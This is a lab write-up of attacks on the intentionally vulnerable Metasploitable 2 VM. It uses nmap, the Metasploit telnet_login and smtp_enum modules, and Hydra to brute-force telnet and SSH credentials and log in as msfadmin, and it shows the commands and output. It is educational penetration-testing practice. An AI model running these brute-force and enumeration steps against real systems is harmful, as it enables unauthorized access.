# > Metasploitable 2 Telnet exploit write-up

Metasploitable 2 is Virtual Machine with many exploitable ports and now we are going to exploit it's one of exploit - telnet.



 > The target of this lab is use vulnerablitity in **telnet** service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.126.0/16   |   Screen View: Unique Hosts                                                                                    
                                                                                                                                                         
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.95   00:0c:29:c8:07:4e      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

.
23/tcp   open  telnet      Linux telnetd
.
.
```

We'll exploit this vulnerabilty using metasploit, `sudo msfdb init && msfconsole`

Search for telnet login, `msf6 auxiliary(scanner/smtp/smtp_enum) > search telnet login`

```
atching Modules
================

   #  Name                                                              Disclosure Date  Rank       Check  Description
   -  ----                                                              ---------------  ----       -----  -----------
   .
   5  auxiliary/scanner/telnet/telnet_login                             .                normal     No     Telnet Login Check Scanner
   .
   .                          .                
   ```

Using 5th module, look for it's optiosn; `msf6 auxiliary(scanner/telnet/telnet_login) > show options`

We need to set following,

```
msf6 auxiliary(scanner/telnet/telnet_login) > set PASS_FILE login.txt
PASS_FILE => login.txt
msf6 auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.168.43.95
RHOSTS => 192.168.43.95
msf6 auxiliary(scanner/telnet/telnet_login) > set STOP_ON_SUCCESS true 
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/telnet/telnet_login) > set USER_FILE login.txt
USER_FILE => login.txt
```
> **login.txt** is file that consists of possible passwords and username

## Exploitation:

Just hit run; 

```
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: sudo:root (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: sudo:sudo (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: sudo:msfadmin (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: sudo:password (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: sudo: (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: msfadmin:admin (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: msfadmin:12345678 (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: msfadmin:minecraft (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: msfadmin:juventus (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: msfadmin:root (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: msfadmin:sudo (Incorrect: )
[+] 192.168.43.95:23      - 192.168.43.95:23 - Login Successful: msfadmin:msfadmin
```

> We found the Password and username - **msfadmin**

Now finally to log in, use `telnet 192.168.43.95`

```
Trying 192.168.43.95...
Connected to 192.168.43.95.
Escape character is '^]'.
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


metasploitable login: msfadmin
Password: 

Login incorrect
metasploitable login: msfadmin
Password: 
Last login: Tue Jul  9 10:22:17 EDT 2024 on pts/1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
msfadmin@metasploitable:~$ whoami
msfadmin
```

We have gained the access of machine!








# > Metasploitable 2 SMTP exploit write-up



 ## 1- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

.
25/tcp   open  smtp        Postfix smtpd
.
.
.
```

After a little research I found that *smtp_enum* is availble on metasploit, from which we can enter in SMTP service. 

Now we use metasploit to exploit this vulnerablity.

`sudo msfdb init && msfconsole`



`msf6 > search smtp_enum`


```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
  1  auxiliary/scanner/smtp/smtp_enum              .                normal  No     SMTP User Enumeration Utility
```

Now we use smtp enumeration to find users on SMTP.

`msf6 > use 1`

For setting of exploit;

 `msf6 auxiliary(scanner/smtp/smtp_enum) > show options`

In options we see Remote Host is not set, so use `set RHOST 192.168.43.95`, to set remote host.

And for User_file, we use login.txt - a wordlist of possoble usernames. `set USER_FILE login.txt`



 Now with all set, just hit `run`


 ```
[*] 192.168.43.95:25      - 192.168.43.95:25 Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
[+] 192.168.43.95:25      - 192.168.43.95:25 Users found: msfadmin
[*] 192.168.43.95:25      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

 We found username *msfadmin*.




## 3- Exploit

We need username to find password through bruteforce in Hydra.So lets now find password:

`hydra -t 4 -l msfadmin -P login.txt -vV 192.168.43.95 ssh `

Using this command, we found password: *msfadmin*.

Now lets login useing ssh:

`ssh msfadmin@192.168.43.95`

It will ask for password, enter the password and we have gained the access!

```
msfadmin@192.168.43.95's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Tue Jul  9 10:27:21 2024 from anyway
msfadmin@metasploitable:~$ whoami
msfadmin
```